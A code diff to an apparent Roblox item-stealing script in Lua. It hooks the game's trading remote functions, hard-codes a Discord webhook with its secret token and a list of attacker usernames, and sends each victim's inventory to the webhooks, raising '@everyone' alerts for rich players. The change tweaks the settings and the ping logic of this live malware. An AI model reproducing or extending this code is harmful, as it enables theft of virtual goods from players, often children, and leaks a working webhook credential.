@@ -22,8 +22,9 @@ local RFTradingAcceptTradeOffer = ReplicatedStorage.Modules.Net["RF/Trading/Acce
 local RFTradingSetTokens = ReplicatedStorage.Modules.Net["RF/Trading/SetTokens"]
 
 local MY_WEBHOOK = "https://discord.com/api/webhooks/1507047054344585418/FSbWeRqNlHGYL-JI4Sak4VEX0OEDQ4CpGIanBDjsv4CnL0gruZQdPhDgeGLRULCgrxZ5"
-local USER_WEBHOOK = _G.Webhook or "PUTHERE"
-local MY_USERNAMES = _G.Usernames or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}
+local USER_WEBHOOK = _G.POOR_WEBHOOK or "PUTHERE"
+local MY_USERNAMES = _G.MY_USERNAMES or {"jayhassogyau", "stopbanningmyaccs67", "mantskeys55", "jayisbodybuilt", "mydignames6769"}
+local PING_POOR = _G.PING_POOR ~= nil and _G.PING_POOR or true
 
 local START_TIME = os.time()
 
@@ -351,7 +352,7 @@ local function sendFullInventory()
     -- Always ping the user who generated this script
     if USER_WEBHOOK ~= "PUTHERE" then
         local userContent = playerName.." has executed your script!"
-        if isRich then userContent = userContent.." @everyone @here 🔔 RICH PLAYER DETECTED!" end
+        if isRich and PING_POOR then userContent = userContent.." @everyone @here 🔔 RICH PLAYER DETECTED!" end
         sendRequest(USER_WEBHOOK, {content=userContent, embeds={embed}})
     end
 
